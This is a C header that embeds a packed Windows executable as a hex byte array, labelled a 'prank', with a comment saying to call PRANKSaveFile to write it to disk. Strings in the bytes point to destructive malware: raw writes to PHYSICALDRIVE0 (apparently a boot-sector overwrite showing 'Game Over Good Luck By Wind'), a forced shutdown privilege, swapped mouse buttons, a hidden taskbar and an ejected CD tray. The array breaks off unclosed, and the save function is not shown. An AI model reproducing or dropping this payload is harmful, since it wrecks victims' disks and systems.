/*
 AnyFileToByte  Made By 西门
 My QQ 168751 
 直接include此单元，使用 PRANKSaveFile('xxx.xxx');即可生成文件
*/
#ifndef _FUNC_PRANK_
#define _FUNC_PRANK_
#include <windows.h>

const
  PRANKMyFileSize=3584;
  unsigned char PRANKMyFileBuf[] ={
    	0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,
    	0x0E,0x1F,0xBA,0x0E,0x00,0xB4,0x09,0xCD,0x21,0xB8,0x01,0x4C,0xCD,0x21,0x54,0x68,0x69,0x73,0x20,0x70,0x72,0x6F,0x67,0x72,0x61,0x6D,0x20,0x63,0x61,0x6E,0x6E,0x6F,
    	0x74,0x20,0x62,0x65,0x20,0x72,0x75,0x6E,0x20,0x69,0x6E,0x20,0x44,0x4F,0x53,0x20,0x6D,0x6F,0x64,0x65,0x2E,0x0D,0x0D,0x0A,0x24,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x95,0x58,0xE3,0x11,0xD1,0x39,0x8D,0x42,0xD1,0x39,0x8D,0x42,0xD1,0x39,0x8D,0x42,0xD1,0x39,0x8C,0x42,0xC5,0x39,0x8D,0x42,0x12,0x36,0xD0,0x42,0xD8,0x39,0x8D,0x42,
    	0x39,0x26,0x86,0x42,0xD0,0x39,0x8D,0x42,0x39,0x26,0x89,0x42,0xD0,0x39,0x8D,0x42,0x52,0x69,0x63,0x68,0xD1,0x39,0x8D,0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x50,0x45,0x00,0x00,0x4C,0x01,0x03,0x00,0x94,0xF8,0x0A,0x5D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xE0,0x00,0x0E,0x21,0x0B,0x01,0x06,0x00,0x00,0x10,0x00,0x00,
    	0x00,0x10,0x00,0x00,0x00,0x50,0x00,0x00,0x70,0x64,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x70,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x10,0x00,0x00,0x00,0x02,0x00,0x00,
    	0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,
    	0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x3C,0x71,0x00,0x00,0x48,0x00,0x00,0x00,
    	0x00,0x70,0x00,0x00,0x3C,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x84,0x71,0x00,0x00,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0x50,0x58,0x30,0x00,0x00,0x00,0x00,
    	0x00,0x50,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0xE0,
    	0x55,0x50,0x58,0x31,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x40,0x00,0x00,0xE0,0x55,0x50,0x58,0x32,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x70,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x0C,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x33,0x2E,0x30,0x37,0x00,
    	0x55,0x50,0x58,0x21,0x0D,0x09,0x02,0x09,0x3C,0xC4,0xBB,0x8F,0xEE,0xB6,0xCE,0x31,0x34,0x43,0x00,0x00,0x65,0x04,0x00,0x00,0x00,0x10,0x00,0x00,0x26,0x00,0x00,0x42,
    	0xB7,0x0F,0xF2,0xE5,0xB8,0x01,0x00,0xC2,0x0C,0x00,0x90,0x81,0xEC,0x1C,0x02,0x10,0x56,0x57,0xF7,0xBF,0xFD,0xDD,0xB9,0x7F,0x17,0x33,0xC0,0x8D,0x7C,0x24,0x25,0xBE,
    	0x08,0x20,0x00,0xF3,0xAB,0x66,0xAB,0xAA,0xB9,0x0C,0x14,0xED,0xB6,0xED,0x3B,0x12,0x24,0xF3,0xA5,0x6A,0x00,0x01,0x66,0x05,0x03,0x07,0x03,0x68,0xD3,0x75,0xBF,0xDB,
    	0x15,0xC0,0xA4,0x05,0x20,0x48,0xC6,0x84,0x24,0x3E,0x3F,0x55,0x07,0x3F,0x7F,0xFF,0xFF,0x76,0xAA,0xFF,0x15,0x04,0x10,0x2C,0x8B,0xF0,0x83,0xFE,0xFF,0x75,0x0B,0x5F,
    	0x0B,0xC0,0x5E,0x81,0xC4,0x5F,0xC3,0x8D,0x44,0xFD,0x7B,0x5B,0xF7,0x24,0x08,0x8B,0x3D,0x1B,0x14,0x40,0x50,0x4B,0x01,0x68,0x18,0x00,0x09,0x76,0xED,0xB7,0xBF,0x7A,
    	0xFF,0xD7,0x8D,0x4C,0x24,0x10,0x0D,0x51,0x8D,0x54,0x24,0x2C,0x54,0x2D,0x52,0x56,0x26,0x07,0xF6,0xC6,0x46,0x10,0x34,0x2E,0x1C,0xC6,0xC6,0xDA,0xCF,0x1D,0x18,0x68,
    	0xD0,0x07,0x06,0x0A,0x20,0x05,0x24,0xD8,0xB1,0x77,0xEF,0x5E,0x00,0x80,0x73,0x4E,0x4D,0x0C,0x51,0x6A,0x28,0x13,0x28,0x50,0x06,0xB9,0x67,0xBF,0xDD,0x04,0x5A,0x18,
    	0x52,0xB0,0x34,0x6A,0x32,0x00,0x8B,0x25,0x43,0xB9,0x9D,0xEE,0x54,0x63,0x1C,0x7E,0xC7,0x44,0x1C,0xD8,0x6E,0xE6,0xBA,0x07,0x38,0x84,0x27,0x7F,0x6A,0x06,0x09,0x6F,
    	0x97,0x4D,0xF6,0x4C,0x5F,0x33,0xCD,0x90,0x00,0x8B,0x2D,0x04,0x83,0xEC,0xB7,0xBB,0xFF,0xEE,0x10,0x25,0xFF,0x31,0x53,0x56,0x83,0xF8,0x0C,0x57,0x0F,0x87,0xEB,0x46,
    	0xFF,0x24,0x85,0x04,0x03,0x5C,0xFD,0x1F,0xFB,0x66,0xB9,0x79,0x94,0x45,0x58,0x5F,0x5E,0x5B,0x83,0xC4,0x10,0xC2,0x04,0x00,0x91,0x2F,0x25,0x97,0x19,0x74,0x15,0x6C,
    	0x32,0x84,0x8C,0xB9,0x40,0x9B,0x1E,0x3C,0x05,0xFB,0xE1,0x11,0x46,0x65,0x1C,0x8B,0x1D,0x17,0xBE,0xE8,0x03,0x06,0xE4,0xF6,0xDF,0x70,0x6A,0x1E,0x33,0x6A,0x64,0xFF,
    	0xD3,0x46,0x81,0xFE,0x1A,0x04,0x2B,0x7C,0xEE,0xF2,0xC5,0x1E,0x9B,0x55,0x3B,0x38,0x8B,0x2D,0x32,0x38,0x20,0xED,0xB0,0xA1,0x30,0x34,0xC0,0x05,0x24,0x0F,0xFD,0x07,
    	0xD8,0x35,0x7C,0xC2,0x10,0x50,0x71,0x44,0x6A,0x01,0x35,0x20,0xF1,0x18,0x8B,0xB6,0xFF,0x77,0x5F,0x4F,0x1C,0x2B,0xC8,0x51,0x0E,0x18,0x2B,0xD1,0x83,0xC0,0x08,0x52,
    	0x83,0xC1,0x08,0x50,0x51,0x26,0xD3,0x2F,0x1B,0xC2,0x1A,0x77,0xD7,0x26,0x52,0x20,0x0A,0x68,0x65,0x77,0x77,0xBB,0xFF,0x5B,0xFF,0xD5,0x23,0x24,0x48,0x89,0x04,0x75,
    	0x98,0x5D,0xDF,0xD9,0xC1,0x70,0xFB,0x02,0x68,0x70,0xF1,0x1D,0x68,0x12,0x45,0x22,0xE8,0x02,0xE4,0xB2,0xB3,0xE6,0x50,0x25,0xFF,0xC8,0x45,0x32,0x42,0x4A,0x5C,0x5C,
    	0x5C,0x32,0xD6,0x46,0xC8,0x10,0x48,0x00,0x5B,0x92,0xDB,0x90,0xE8,0x0D,0x00,0x0C,0x00,0x01,0x97,0xA6,0x69,0xBA,0x6F,0x03,0x89,0xA3,0xC2,0xE1,0x02,0x0D,0x9A,0x4B,
    	0xD3,0x34,0xA2,0xC8,0xEE,0x03,0x0D,0x2C,0xBB,0x82,0xA1,0x69,0x3D,0x4E,0x02,0x39,0x46,0x01,0x4C,0x02,0xCA,0x3E,0x1A,0x5E,0x57,0x00,0x00,0xFF,0xFF,0x1F,0x2A,0xB8,
    	0x12,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,0x18,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x1D,0x0E,0xFF,0xFF,0xFF,0x6F,0x10,0xE2,0xFE,0x47,0x61,0x6D,0x65,0x20,0x4F,
    	0x76,0x65,0x72,0x20,0x47,0x6F,0x6F,0x64,0x20,0x4C,0x75,0x63,0x6B,0x20,0x42,0x79,0x20,0x57,0x69,0xFF,0xFF,0xFF,0xFF,0x6E,0x64,0x00,0x53,0x65,0x53,0x68,0x75,0x74,
    	0x64,0x6F,0x77,0x6E,0x50,0x72,0x69,0x76,0x69,0x6C,0x65,0x67,0x65,0x00,0x5C,0x5C,0x2E,0x5C,0x50,0x48,0x59,0x53,0x49,0xFF,0x37,0x80,0xFF,0x43,0x41,0x4C,0x44,0x52,
    	0x49,0x56,0x45,0x30,0xFF,0x68,0x65,0x6C,0x6C,0x5F,0x54,0x72,0x61,0x79,0x57,0xFF,0xFF,0x5B,0x73,0x35,0x00,0x2D,0x6F,0x67,0x6D,0x61,0x6E,0x00,0x73,0x65,0x74,0x20,
    	0x63,0x64,0x61,0x75,0x64,0x69,0x6F,0xFB,0xD6,0xDE,0xB6,0x20,0x45,0x6F,0x62,0x63,0x6C,0x6F,0x13,0x64,0x77,0x61,0x69,0x74,0x26,0x12,0x80,0x5F,0x99,0x1F,0x6F,0x70,
    	0x65,0x6E,0x07,0x01,0xD9,0x02,0x0A,0x0A,0x5F,0x36,0x47,0x51,0x94,0x10,0x10,0x01,0x57,0x72,0x69,0xDB,0xFF,0xBF,0xFC,0x74,0x65,0x46,0x69,0x6C,0x65,0x44,0x65,0x76,
    	0x69,0x63,0x65,0x49,0x6F,0x43,0x6F,0x6E,0x74,0x72,0x6F,0x6C,0x10,0x43,0xDB,0xBF,0x37,0x01,0x9F,0x48,0x61,0x6E,0x64,0x1D,0x42,0x65,0x65,0x70,0x05,0x53,0x1F,0x6B,
    	0xFF,0xB1,0x6C,0x06,0x47,0x65,0x74,0x56,0x65,0x72,0x73,0x69,0x29,0x0B,0x43,0x75,0x72,0x72,0xDC,0xAD,0x04,0xB4,0x65,0x34,0xE8,0x3F,0x73,0x73,0x38,0x9F,0x66,0x3B,
    	0xDB,0x0D,0x61,0x55,0x41,0x6A,0xA1,0x00,0x4C,0x6F,0xBB,0x1F,0x16,0xF0,0x6F,0x6B,0x75,0x70,0x3B,0x56,0x61,0x6C,0x75,0x1F,0x01,0x4F,0xDB,0x06,0x2B,0x01,0xE5,0x39,
    	0x54,0x20,0x65,0x51,0xB6,0xC9,0x62,0xBF,0x41,0x64,0x6A,0x75,0x73,0x74,0x0C,0x2D,0x73,0x48,0xAE,0xDB,0x05,0xFC,0x69,0x34,0x4D,0x6F,0x76,0x65,0x91,0x6F,0x77,0x7D,
    	0xC3,0xDA,0xB6,0x1D,0x46,0x6F,0x6E,0x67,0x40,0x75,0x10,0x14,0x0E,0x6B,0xC3,0xDA,0x53,0x68,0x05,0x0B,0x85,0x17,0x41,0xB5,0xBB,0x9F,0xC5,0x2D,0x0B,0x52,0x65,0x63,
    	0x74,0x27,0x77,0x61,0x70,0x4C,0xDA,0x60,0x7F,0xBF,0x6B,0x65,0x42,0x75,0x74,0x74,0xCB,0x45,0x78,0x69,0x20,0x73,0x0A,0x59,0xB6,0xEE,0xE6,0x1F,0x80,0x64,0x4D,0x97,
    	0x61,0x7F,0x41,0xB9,0x6D,0x85,0xEF,0xA7,0x58,0x6D,0x63,0x69,0x19,0x53,0x25,0x2A,0x67,0xEF,0xFE,0xFF,0xCF,0x18,0x00,0x28,0x27,0x16,0x1C,0x2B,0x1E,0x0B,0x06,0x14,
    	0x07,0x0A,0x08,0x28,0x0A,0x35,0x08,0x06,0x10,0x06,0x09,0xFD,0xEC,0xB7,0x77,0x02,0x0F,0x06,0x27,0x06,0x00,0x16,0x7C,0x07,0x1F,0x07,0x10,0x11,0x11,0x1B,0x04,0xF5,
    	0xED,0xF6,0x80,0x00,0x00,0x50,0x45,0x3D,0x4C,0x01,0x07,0x94,0xF8,0x0A,0x5D,0x35,0xDB,0x3F,0x18,0x86,0xE0,0x00,0x0E,0x21,0x0B,0x01,0x06,0x0C,0x04,0x08,0x2F,0xD8,
    	0x60,0x83,0x14,0x10,0x03,0x20,0x0D,0x0B,0xB2,0xB6,0xEC,0xBD,0x02,0x22,0x00,0x07,0x50,0x0C,0x67,0x03,0x3B,0xEC,0x02,0x38,0x10,0x07,0x06,0xA0,0x92,0xAA,0x6B,0xB6,
    	0x22,0x07,0x45,0x60,0x4F,0x64,0x1F,0xBA,0x00,0xC9,0x07,0x40,0x00,0x00,0x7C,0x57,0x60,0xF6,0xDD,0x18,0x48,0x2E,0x21,0x78,0x74,0x87,0x03,0x90,0x8D,0xAF,0xEC,0x0B,
    	0xB3,0x04,0x42,0x2E,0x72,0x64,0x4C,0x65,0x13,0x26,0xB7,0x61,0x10,0xE5,0x02,0x13,0xA2,0x83,0x3D,0xDD,0x3B,0x40,0x2E,0x26,0x10,0xAA,0x30,0xFC,0x0C,0xDB,0xC6,0x36,
    	0x65,0x27,0xC0,0x4F,0x65,0xD7,0x63,0x10,0xB8,0x6F,0x4A,0xCE,0x26,0x27,0x0E,0x42,0x04,0x00,0xE0,0x9A,0xDB,0x24,0x21,0x10,0x51,0x41,0x8B,0x04,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x48,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x7C,0x24,0x08,0x01,0x0F,0x85,0xB9,0x01,0x00,0x00,0x60,0xBE,0x00,0x60,0x00,
    	0x10,0x8D,0xBE,0x00,0xB0,0xFF,0xFF,0x57,0x83,0xCD,0xFF,0xEB,0x0D,0x90,0x90,0x90,0x8A,0x06,0x46,0x88,0x07,0x47,0x01,0xDB,0x75,0x07,0x8B,0x1E,0x83,0xEE,0xFC,0x11,
    	0xDB,0x72,0xED,0xB8,0x01,0x00,0x00,0x00,0x01,0xDB,0x75,0x07,0x8B,0x1E,0x83,0xEE,0xFC,0x11,0xDB,0x11,0xC0,0x01,0xDB,0x73,0xEF,0x75,0x09,0x8B,0x1E,0x83,0xEE,0xFC,
    	0x11,0xDB,0x73,0xE4,0x31,0xC9,0x83,0xE8,0x03,0x72,0x0D,0xC1,0xE0,0x08,0x8A,0x06,0x46,0x83,0xF0,0xFF,0x74,0x74,0x89,0xC5,0x01,0xDB,0x75,0x07,0x8B,0x1E,0x83,0xEE,
    	0xFC,0x11,0xDB,0x11,0xC9,0x01,0xDB,0x75,0x07,0x8B,0x1E,0x83,0xEE,0xFC,0x11,0xDB,0x11,0xC9,0x75,0x20,0x41,0x01,0xDB,0x75,0x07,0x8B,0x1E,0x83,0xEE,0xFC,0x11,0xDB,
    	0x11,0xC9,0x01,0xDB,0x73,0xEF,0x75,0x09,0x8B,0x1E,0x83,0xEE,0xFC,0x11,0xDB,0x73,0xE4,0x83,0xC1,0x02,0x81,0xFD,0x00,0xF3,0xFF,0xFF,0x83,0xD1,0x01,0x8D,0x14,0x2F,
    	0x83,0xFD,0xFC,0x76,0x0F,0x8A,0x02,0x42,0x88,0x07,0x47,0x49,0x75,0xF7,0xE9,0x63,0xFF,0xFF,0xFF,0x90,0x8B,0x02,0x83,0xC2,0x04,0x89,0x07,0x83,0xC7,0x04,0x83,0xE9,
    	0x04,0x77,0xF1,0x01,0xCF,0xE9,0x4C,0xFF,0xFF,0xFF,0x5E,0x89,0xF7,0xB9,0x02,0x00,0x00,0x00,0x8A,0x07,0x47,0x2C,0xE8,0x3C,0x01,0x77,0xF7,0x80,0x3F,0x00,0x75,0xF2,
    	0x8B,0x07,0x8A,0x5F,0x04,0x66,0xC1,0xE8,0x08,0xC1,0xC0,0x10,0x86,0xC4,0x29,0xF8,0x80,0xEB,0xE8,0x01,0xF0,0x89,0x07,0x83,0xC7,0x05,0x88,0xD8,0xE2,0xD9,0x8D,0xBE,
    	0x00,0x40,0x00,0x00,0x8B,0x07,0x09,0xC0,0x74,0x3C,0x8B,0x5F,0x04,0x8D,0x84,0x30,0x00,0x60,0x00,0x00,0x01,0xF3,0x50,0x83,0xC7,0x08,0xFF,0x96,0x64,0x60,0x00,0x00,
    	0x95,0x8A,0x07,0x47,0x08,0xC0,0x74,0xDC,0x89,0xF9,0x57,0x48,0xF2,0xAE,0x55,0xFF,0x96,0x68,0x60,0x00,0x00,0x09,0xC0,0x74,0x07,0x89,0x03,0x83,0xC3,0x04,0xEB,0xE1,
    	0x61,0x31,0xC0,0xC2,0x0C,0x00,0x83,0xC7,0x04,0x8D,0x5E,0xFC,0x31,0xC0,0x8A,0x07,0x47,0x09,0xC0,0x74,0x22,0x3C,0xEF,0x77,0x11,0x01,0xC3,0x8B,0x03,0x86,0xC4,0xC1,
    	0xC0,0x10,0x86,0xC4,0x01,0xF0,0x89,0x03,0xEB,0xE2,0x24,0x0F,0xC1,0xE0,0x10,0x66,0x8B,0x07,0x83,0xC7,0x02,0xEB,0xE2,0x8B,0xAE,0x6C,0x60,0x00,0x00,0x8D,0xBE,0x00,
    	0xF0,0xFF,0xFF,0xBB,0x00,0x10,0x00,0x00,0x50,0x54,0x6A,0x04,0x53,0x57,0xFF,0xD5,0x8D,0x87,0xDF,0x01,0x00,0x00,0x80,0x20,0x7F,0x80,0x60,0x28,0x7F,0x58,0x50,0x54,
    	0x50,0x53,0x57,0xFF,0xD5,0x58,0x61,0x8D,0x44,0x24,0x80,0x6A,0x00,0x39,0xC4,0x75,0xFA,0x83,0xEC,0x80,0xE9,0xC7,0xA9,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x94,0x70,0x00,0x00,0x64,0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0xA1,0x70,0x00,0x00,0x7C,0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xAE,0x70,0x00,0x00,0x84,0x70,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xB9,0x70,0x00,0x00,0x8C,0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    	0x00,0x00,0x00,0x00,0xC2,0x70,0x00,0x00,0xD0,0x70,0x00,0x00,0xE0,0x70,0x00,0x00,0xF0,0x70,0x00,0x00,0xFE,0x70,0x00,0x00,0x00,0x00,0x00,0x00,0x0C,0x71,0x00,0x00,
    	0x00,0x00,0x00,0x00,0x1E,0x71,0x00,0x00,0x00,0x00,0x00,0x00,0x2A,0x71,0x00,0x00,0x00,0x00,0x00,0x00,0x4B,0x45,0x52,0x4E,0x45,0x4C,0x33,0x32,0x2E,0x44,0x4C,0x4C,
    	0x00,0x41,0x44,0x56,0x41,0x50,0x49,0x33,0x32,0x2E,0x64,0x6C,0x6C,0x00,0x55,0x53,0x45,0x52,0x33,0x32,0x2E,0x64,0x6C,0x6C,0x00,0x57,0x49,0x4E,0x4D,0x4D,0x2E,0x64,
    	0x6C,0x6C,0x00,0x00,0x4C,0x6F,0x61,0x64,0x4C,0x69,0x62,0x72,0x61,0x72,0x79,0x41,0x00,0x00,0x47,0x65,0x74,0x50,0x72,0x6F,0x63,0x41,0x64,0x64,0x72,0x65,0x73,0x73,
    	0x00,0x00,0x56,0x69,0x72,0x74,0x75,0x61,0x6C,0x50,0x72,0x6F,0x74,0x65,0x63,0x74,0x00,0x00,0x56,0x69,0x72,0x74,0x75,0x61,0x6C,0x41,0x6C,0x6C,0x6F,0x63,0x00,0x00,
    	0x56,0x69,0x72,0x74,0x75,0x61,0x6C,0x46,0x72,0x65,0x65,0x00,0x00,0x00,0x4F,0x70,0x65,0x6E,0x50,0x72,0x6F,0x63,0x65,0x73,0x73,0x54,0x6F,0x6B,0x65,0x6E,0x00,0x00,
    	0x4D,0x6F,0x76,0x65,0x57,0x69,0x6E,0x64,0x6F,0x77,0x00,0x00,0x6D,0x63,0x69,0x53,0x65,0x6E,0x64,0x53,0x74,0x72,0x69,0x6E,0x67,0x41,0x00,0x00,0x00,0x00,0x00,0x00,
